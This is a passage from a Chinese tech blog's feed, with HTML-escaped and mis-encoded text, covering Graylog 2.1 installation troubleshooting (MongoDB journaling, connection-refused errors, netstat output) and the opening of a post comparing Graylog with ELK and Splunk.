&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /etc/graylog/server/ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cp graylog.conf.example /etc/graylog/server/server.conf&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(5)å¯åŠ¨graylog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨graylogå®‰è£…binç›®å½•ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./graylogctl start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æŸ¥çœ‹æ—¥å¿—ï¼Œåœ¨graylogå®‰è£…ç›®å½•ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tail -200f /&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/graylog-server.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœæŠ¥é”™ï¼š&lt;/p&gt;
&lt;p&gt;åŸå› ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨mongodbç‰ˆæœ¬2.6ä¹‹åï¼Œæ˜¯éœ€è¦æ—¥å¿—journalingè®¾ç½®çš„ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„&lt;/p&gt;
&lt;p&gt;è§£å†³åŠæ³•ï¼š&lt;/p&gt;
&lt;p&gt;åœ¨mongodbå¯åŠ¨å‘½ä»¤åŠ ä¸Š â€“journal&lt;/p&gt;
&lt;p&gt;æœ€åå¯åŠ¨å‘½ä»¤ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;./mongod --dbpath=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/mongodb/data/ --fork --logpath=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/mongodb/logs --storageEngine=mmapv1 --journal&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é‡å¯mongodbåï¼Œé‡å¯graylogæœåŠ¡å³å¯ï¼&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(6)å¯åŠ¨graylog(æŠ¥é”™äºŒ)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æ—¥å¿—ï¼Œåœ¨graylogå®‰è£…ç›®å½•ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tail -200f /&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/graylog-server.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;com.mongodb.MongoSocketOpenException: Exception opening socket&amp;#125;, caused by &amp;#123;java.net.ConnectException: æ‹’ç»è¿æ¥&amp;#125;&amp;#125;]&amp;#125;. Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; 30000 ms before timing out&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,355 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Elastic Beats Input 1.1.1 [org.graylog.plugins.beats.BeatsInputPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Collector 1.1.1 [org.graylog.plugins.collector.CollectorPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Enterprise Integration Plugin 1.1.1 [org.graylog.plugins.enterprise_integration.EnterpriseIntegrationPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,358 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: MapWidgetPlugin 1.1.1 [org.graylog.plugins.map.MapWidgetPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Pipeline Processor Plugin 1.1.1 [org.graylog.plugins.pipelineprocessor.ProcessorPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Anonymous Usage Statistics 2.1.1 [org.graylog.plugins.usagestatistics.UsageStatsPlugin]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2016-11-22 15:10:29,487 INFO : org.graylog2.bootstrap.CmdLineTool - Running with JVM arguments: -Djava.library.path=./../lib/sigar -Xms1g -Xmx1g -XX:NewRatio=1 -XX:+ResizeTLAB -XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:-OmitStackTraceInFastThrow&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æç¤ºmongodb æ‹’ç»è¿æ¥ã€‚ è¿™ä¸ªæ—¶å€™éœ€è¦çœ‹ä¸‹ç«¯å£åœ°å€æ˜¯å¦æ˜¯IPåœ°å€è¿˜æ˜¯127.0.0.1 å¦‚æœä¸æ˜¯éœ€è¦ä¿®æ”¹ä¸‹åœ¨é‡å¯æœåŠ¡å°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æŸ¥çœ‹å¯åŠ¨æœåŠ¡ç«¯å£ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@graylog graylog-2.1.1]&lt;span class=&quot;comment&quot;&gt;# netstat -ntulp&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Active Internet connections (only servers)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:27017             0.0.0.0:*                   LISTEN      22308/mongod&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      1974/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      1287/master&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9350   :::*                        LISTEN      23642/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9000   :::*                        LISTEN      23642/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9200   :::*                        LISTEN      18405/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::ffff:192.168.1.234:9300   :::*                        LISTEN      18405/java&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 :::22                       :::*                        LISTEN      1974/sshd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tcp        0      0 ::1:25                      :::*                        LISTEN      1287/master&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(6)è®¿é—®graylog&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;graylogå¯åŠ¨æˆåŠŸåï¼Œæµè§ˆå™¨è®¿é—®ï¼š&lt;strong&gt;graylogå®‰è£…IP:9000&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;å››ï¼šæ€»ç»“&quot;&gt;&lt;a href=&quot;#å››ï¼šæ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;å››ï¼šæ€»ç»“&quot;&gt;&lt;/a&gt;å››ï¼šæ€»ç»“&lt;/h3&gt;&lt;p&gt;åˆ°æ­¤ï¼ŒåŸºç¡€çš„é›†ä¸­æ—¥å¿—ç®¡ç†graylogå®‰è£…å®Œæ¯•ï¼ï¼Œåç»­å°†ç»§ç»­ä»‹ç»ï¼š&lt;/p&gt;
&lt;p&gt;å®‰è£…éƒ¨ç½²Graylog Collector Sidecar æ”¶é›†åº”ç”¨æ—¥å¿—&lt;/p&gt;
&lt;p&gt;é‡‡ç”¨syslogæ”¶é›†æ—¥å¿—æ–¹å¼&lt;/p&gt;
&lt;p&gt;graylogä¸€äº›ä½¿ç”¨ï¼ŒåŒ…æ‹¬æ—¥å¿—æˆªå–ï¼Œå‘Šè­¦ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å‰ä¹Ÿå®è·µè¿‡ELKæŠ€æœ¯æ ˆï¼Œåæ¥é€‰å‹graylogï¼Œæ˜¯åŸºäºgraylogå¸¦æœ‰çš„æƒé™ç®¡ç†ï¼Œå’Œå‘Šè­¦åŠŸèƒ½æ¯”è¾ƒå®Œå–„ï¼&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;graylog-å‡çº§2-1-é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot;&gt;&lt;a href=&quot;#graylog-å‡çº§2-1-é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot; class=&quot;headerlink&quot; title=&quot;graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot;&gt;&lt;/a&gt;graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³
    
    </summary>
    
      <category term="æ—¥å¿—åˆ†æå¹³å°" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch</title>
    <link href="http://blog.yangcvo.me/2016/11/13/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Graylog/Graylog%E2%80%94%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E5%AE%8C%E7%BE%8E%E4%BB%A3%E6%9B%BFElasticsearch/"/>
    <id>http://blog.yangcvo.me/2016/11/13/æ—¥å¿—åˆ†æå¹³å°/Graylog/Graylogâ€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch/</id>
    <published>2016-11-13T09:56:03.000Z</published>
    <updated>2017-03-14T05:48:57.000Z</updated>
    
    <content type="html">&lt;p&gt;æ‘˜è¦: æèµ·æ—¥å¿—èšåˆå·¥å…·ï¼Œæœ‰å¼€æºç•Œçš„ELKï¼Œå•†ä¸šç•Œçš„Splunkï¼Œä½†æˆ‘è¦ä»‹ç»å¼€æºçš„åèµ·ä¹‹ç§€Graylogï¼Œå¯ä»¥è¯´æ˜¯é¾™å¤´è€å¤§Splunkçš„å¼€æºç‰ˆã€‚&lt;/p&gt;
&lt;h1 id=&quot;Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch&quot;&gt;&lt;a href=&quot;#Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch&quot; class=&quot;headerlink&quot; title=&quot;Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch&quot;&gt;&lt;/a&gt;Graylogâ€”â€”æ—¥å¿—åˆ†æå¹³å°å®Œç¾ä»£æ›¿Elasticsearch&lt;/h1&gt;&lt;p&gt;å…ˆçœ‹çœ‹ æ¨èï¼&lt;a href=&quot;https://my.oschina.net/HeAlvin/blog/378262&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å›½å¤–ç¨‹åºå‘˜æ•´ç†çš„ç³»ç»Ÿç®¡ç†å‘˜èµ„æºå¤§å…¨&lt;/a&gt; ä¸­ï¼Œå›½å¤–ç¨‹åºå‘˜æ•´ç†çš„æ—¥å¿—èšåˆå·¥å…·çš„åˆ—è¡¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ—¥å¿—ç®¡ç†å·¥å…·ï¼šæ”¶é›†ï¼Œè§£æï¼Œå¯è§†åŒ–&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Elasticsearch - ä¸€ä¸ªåŸºäºLuceneçš„æ–‡æ¡£å­˜å‚¨ï¼Œä¸»è¦ç”¨äºæ—¥å¿—ç´¢å¼•ã€å­˜å‚¨å’Œåˆ†æã€‚&lt;/li&gt;
&lt;li&gt;Fluentd - æ—¥å¿—æ”¶é›†å’Œå‘å‡º&lt;/li&gt;
&lt;li&gt;Flume -åˆ†å¸ƒå¼æ—¥å¿—æ”¶é›†å’Œèšåˆç³»ç»Ÿ&lt;/li&gt;
&lt;li&gt;Graylog2 -å…·æœ‰æŠ¥è­¦é€‰é¡¹çš„å¯æ’å…¥æ—¥å¿—å’Œäº‹ä»¶åˆ†ææœåŠ¡å™¨&lt;/li&gt;
&lt;li&gt;Heka -æµå¤„ç†ç³»ç»Ÿï¼Œå¯ç”¨äºæ—¥å¿—èšåˆ&lt;/li&gt;
&lt;li&gt;Kibana - å¯è§†åŒ–æ—¥å¿—å’Œæ—¶é—´æˆ³æ•°æ®&lt;/li&gt;
&lt;li&gt;Logstash -ç®¡ç†äº‹ä»¶å’Œæ—¥å¿—çš„å·¥å…·&lt;/li&gt;
&lt;li&gt;Octopussy -æ—¥å¿—ç®¡ç†è§£å†³æ–¹æ¡ˆï¼ˆå¯è§†åŒ–/æŠ¥è­¦/æŠ¥å‘Šï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Graylogä¸ELKæ–¹æ¡ˆçš„å¯¹æ¯”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ELKï¼š Logstash -&amp;gt; Elasticsearch -&amp;gt; Kibana ï¼ˆä½¿ç”¨äº†ä¸€äº›æ’ä»¶head ï¼Œmarvelï¼‰&lt;/li&gt;
&lt;li&gt;Graylogï¼š Graylog Collector -&amp;gt; Graylog Server(å°è£…Elasticsearch) -&amp;gt; Graylog Web&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Graylog.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;åšä¸ºè¿ç»´ï¼Œå…¬å¸å†…éƒ¨ä½¿ç”¨elkå¤„ç†æ—¥å¿—å‘ç°å¾ˆå¤šé—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;é¡ºä¾¿æˆªå›¾äº†å‡ å¼ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog-elk.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog-elk1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¹‹å‰è¯•è¿‡Logstash + Elasticsearch + Kibanaçš„æ–¹æ¡ˆï¼Œå‘ç°æœ‰å‡ ä¸ªç¼ºç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸èƒ½å¤„ç†å¤šè¡Œæ—¥å¿—ï¼Œæ¯”å¦‚Mysqlæ…¢æŸ¥è¯¢ï¼ŒTomcat/Jettyåº”ç”¨çš„Javaå¼‚å¸¸æ‰“å°&lt;/li&gt;
&lt;li&gt;ä¸èƒ½ä¿ç•™åŸå§‹æ—¥å¿—ï¼Œåªèƒ½æŠŠåŸå§‹æ—¥å¿—åˆ†å­—æ®µä¿å­˜ï¼Œè¿™æ ·æœç´¢æ—¥å¿—ç»“æœæ˜¯ä¸€å †Jsonæ ¼å¼æ–‡æœ¬ï¼Œæ— æ³•é˜…è¯»ã€‚&lt;/li&gt;
&lt;li&gt;ä¸å¤åˆæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¥å¿—è¡Œï¼Œè¢«å…¨éƒ¨ä¸¢å¼ƒã€‚&lt;/li&gt;
&lt;li&gt;kibanaç»“åˆä½¿ç”¨ç»å¸¸ä¼šå‡ºç°å¡æ­»ã€‚èµ„æºæ¶ˆè€—éå¸¸å¤§ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æœ¬ç€è§£å†³ä»¥ä¸Š3ä¸ªç¼ºç‚¹çš„åŸåˆ™ï¼Œå†æ¬¡å¯»æ‰¾æ›¿ä»£æ–¹æ¡ˆã€‚ é¦–å…ˆæ‰¾åˆ°äº†å•†ä¸šæ—¥å¿—å·¥å…·Splunkï¼Œå·ç§°æ—¥å¿—ç•Œçš„Googleï¼Œæ„æ€æ˜¯å…¨æ–‡æœç´¢æ—¥å¿—çš„èƒ½åŠ›ï¼Œä¸å…‰èƒ½è§£å†³ä»¥ä¸Š3ä¸ªç¼ºç‚¹ï¼Œè¿˜æä¾›æœç´¢å•è¯é«˜äº®æ˜¾ç¤ºï¼Œä¸åŒé”™è¯¯çº§åˆ«æ—¥å¿—æ ‡è‰²ç­‰å¸å¼•äººçš„ç‰¹æ€§ï¼Œä½†æ˜¯å…è´¹ç‰ˆæœ‰500Mé™åˆ¶ï¼Œä»˜è´¹ç‰ˆæ®è¯´è¦3ä¸‡ç¾åˆ€ï¼Œåªèƒ½æ”¾å¼ƒï¼Œç»§ç»­å¯»æ‰¾ã€‚ æœ€åæ‰¾åˆ°äº†Graylogï¼Œç¬¬ä¸€çœ¼çœ‹åˆ°Graylogï¼Œåªæ˜¯ç³»ç»Ÿæ—¥å¿—syslogçš„é‡‡é›†å·¥å…·ï¼Œä¸€ç‚¹ä¹Ÿæ²¡å¸å¼•åˆ°æˆ‘ã€‚ä½†åæ¥æ·±å…¥äº†è§£åï¼Œæ‰å‘ç°Graylogç®€ç›´å°±æ˜¯å¼€æºç‰ˆçš„Splunkã€‚ æˆ‘è‡ªå·±æ€»ç»“çš„Graylogå¸å¼•äººçš„åœ°æ–¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸€ä½“åŒ–æ–¹æ¡ˆï¼Œå®‰è£…æ–¹ä¾¿ï¼Œä¸åƒELKæœ‰3ä¸ªç‹¬ç«‹ç³»ç»Ÿé—´çš„é›†æˆé—®é¢˜ã€‚&lt;/li&gt;
&lt;li&gt;é‡‡é›†åŸå§‹æ—¥å¿—ï¼Œå¹¶å¯ä»¥äº‹åå†æ·»åŠ å­—æ®µï¼Œæ¯”å¦‚http_status_codeï¼Œresponse_timeç­‰ç­‰ã€‚&lt;/li&gt;
&lt;li&gt;è‡ªå·±å¼€å‘é‡‡é›†æ—¥å¿—çš„è„šæœ¬ï¼Œå¹¶ç”¨curl/ncå‘é€åˆ°Graylog Serverï¼Œå‘é€æ ¼å¼æ˜¯è‡ªå®šä¹‰çš„GELFï¼ŒFluntedå’ŒLogstashéƒ½æœ‰ç›¸åº”çš„è¾“å‡ºGELFæ¶ˆæ¯çš„æ’ä»¶ã€‚è‡ªå·±å¼€å‘å¸¦æ¥å¾ˆå¤§çš„è‡ªç”±åº¦ã€‚å®é™…ä¸Šåªéœ€è¦ç”¨inotifywaitç›‘æ§æ—¥å¿—çš„modifyäº‹ä»¶ï¼Œå¹¶æŠŠæ—¥å¿—çš„æ–°å¢è¡Œç”¨curl/netcatå‘é€åˆ°Graylog Serverå°±å¯ã€‚&lt;/li&gt;
&lt;li&gt;æœç´¢ç»“æœé«˜äº®æ˜¾ç¤ºï¼Œå°±åƒgoogleä¸€æ ·ã€‚&lt;/li&gt;
&lt;li&gt;æœç´¢è¯­æ³•ç®€å•ï¼Œæ¯”å¦‚ï¼š source:mongo AND reponse_time_ms:&amp;gt;5000ï¼Œé¿å…ç›´æ¥è¾“å…¥elasticsearchæœç´¢jsonè¯­æ³•&lt;/li&gt;
&lt;li&gt;æœç´¢æ¡ä»¶å¯ä»¥å¯¼å‡ºä¸ºelasticsearchçš„æœç´¢jsonæ–‡æœ¬ï¼Œæ–¹ä¾¿ç›´æ¥å¼€å‘è°ƒç”¨elasticsearch rest apiçš„æœç´¢è„šæœ¬ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Graylogå›¾è§£&lt;/p&gt;
&lt;p&gt;Graylogå¼€æºç‰ˆå®˜ç½‘ï¼š &lt;a href=&quot;https://www.graylog.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.graylog.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ¥å‡ å¼ å®˜ç½‘çš„æˆªå›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.graylog.org/assets/itops_full-87fe2811ab676116142c145affa95b902635b1d6da99718057e8ae9d45c15007.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.graylog.org/assets/overview_dashboard-3817012f923d4a00e9bde1c0547796319cf0396149464f434cfc2ae83a9da826.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Graylogæ˜¯å¼ºå¤§çš„æ—¥å¿—ç®¡ç†ã€åˆ†æå·¥å…·ã€‚å®ƒåŸºäº Elasticsearch, Javaå’ŒMongoDBã€‚&lt;/p&gt;
&lt;p&gt;Graylogå¯ä»¥æ”¶é›†ç›‘æ§å¤šç§ä¸åŒåº”ç”¨çš„æ—¥å¿—ã€‚ä½†æ˜¯ä¸ºäº†ç¤ºèŒƒè¯´æ˜ï¼Œæˆ‘åªæ”¶é›†syslogã€‚å¹¶ä¸”ï¼Œæˆ‘å°†ä¼šæŠŠç”¨åˆ°çš„ç»„ä»¶å…¨éƒ¨å®‰è£…åˆ°ä¸€ä¸ªå•ç‹¬çš„æœåŠ¡å™¨ä¸Šã€‚å¯¹äºå¤§å‹ã€ç”Ÿäº§ç³»ç»Ÿä½ å¯ä»¥æŠŠç»„ä»¶åˆ†å¼€å®‰è£…åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å¯ä»¥æé«˜æ•ˆç‡ã€‚&lt;/p&gt;
&lt;h3 id=&quot;Graylogçš„ç»„ä»¶&quot;&gt;&lt;a href=&quot;#Graylogçš„ç»„ä»¶&quot; class=&quot;headerlink&quot; title=&quot;Graylogçš„ç»„ä»¶&quot;&gt;&lt;/a&gt;Graylogçš„ç»„ä»¶&lt;/h3&gt;&lt;p&gt;Graylogæœ‰4ä¸ªåŸºæœ¬ç»„ä»¶ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight arduino&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Graylog &lt;span class=&quot;built_in&quot;&gt;Server&lt;/span&gt;ï¼šè¿™ä¸ªæœåŠ¡è´Ÿè´£æ¥æ”¶å’Œå¤„ç†æ—¥å¿—/æ¶ˆæ¯ï¼Œå¹¶ä¸”å’Œå…¶ä»–ç»„ä»¶æ²Ÿé€šã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Elasticsearchï¼šå­˜å‚¨æ‰€æœ‰çš„æ—¥å¿—ï¼Œå®ƒçš„æ€§èƒ½ä¾èµ–å†…å­˜å’Œç¡¬ç›˜IOã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MongoDBï¼šå­˜å‚¨å…ƒæ•°æ®ï¼Œè´Ÿè½½ä¸é«˜ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;graylog-Webæ¥å£ï¼šç”¨æˆ·æ¥å£ã€‚&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¸‹é¢æ˜¯Graylogç»„ä»¶ä¹‹é—´çš„å…³ç³»å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ¥è‡ªæˆ‘å…¬å¸å†…éƒ¨åˆ†äº«çš„PPTæ‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Graylog4-ppt.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç”Ÿäº§ç¯å¢ƒ æˆ‘å‚è€ƒç½‘ä¸Šä¸€äº›åšå®¢ç”»çš„å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/graylog5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
